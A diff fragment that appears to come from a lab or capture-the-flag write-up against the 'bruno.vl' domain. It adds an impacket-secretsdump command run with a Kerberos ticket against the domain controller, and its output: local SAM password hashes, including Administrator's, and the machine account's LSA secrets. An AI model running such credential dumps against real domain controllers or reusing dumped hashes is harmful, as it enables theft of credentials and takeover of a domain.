@@ -473,5 +473,25 @@ export KRB5CCNAME=administrator@cifs_BRUNODC.bruno.vl@BRUNO.VL.ccache
 ```
 
 ```python
+impacket-secretsdump -k -no-pass BRUNODC.bruno.vl
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:850e9b2af4245da7880c3e57b3bd0dee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+BRUNO\BRUNODC$:plain_password_hex:bef8d31d0b159e05ce5dbf6141b7e94517fbbf80bb130fe3bb965f66cd97dbaccfeaec78eb985cda4ced51b1eb779676e217ee0f12fccecd9679a87653f5f5e0b94ce117fa8c63ee374efee6aa55ccc74124e758b6007aaef15964ed94e99cab7d4b32776f5b862e2baa6a6e0bb5db9fc72f49a5f9013e4968240d7f7a06755c1558f50c34874e71f988d83bade80c2dfa9a0d3e3cac38ee24a2e353375bbcb2c1540b0ac9245cda18ab6ffa9708438503dc038bebbf0959bab1942ad4306606c1cdb9e0e7465ea6b955c1bd7e5a03a6fea5dc4d70ee57a6d7b9b9aca8ea295aea61b6c077fa10ab63962836a6c336af
+BRUNO\BRUNODC$:aad3b435b51404eeaad3b435b51404ee:4c1d8bc9a8067acf82233c7b6400234e:::
+.........[SNIP]
+```
+
+```python
 
 ```
+
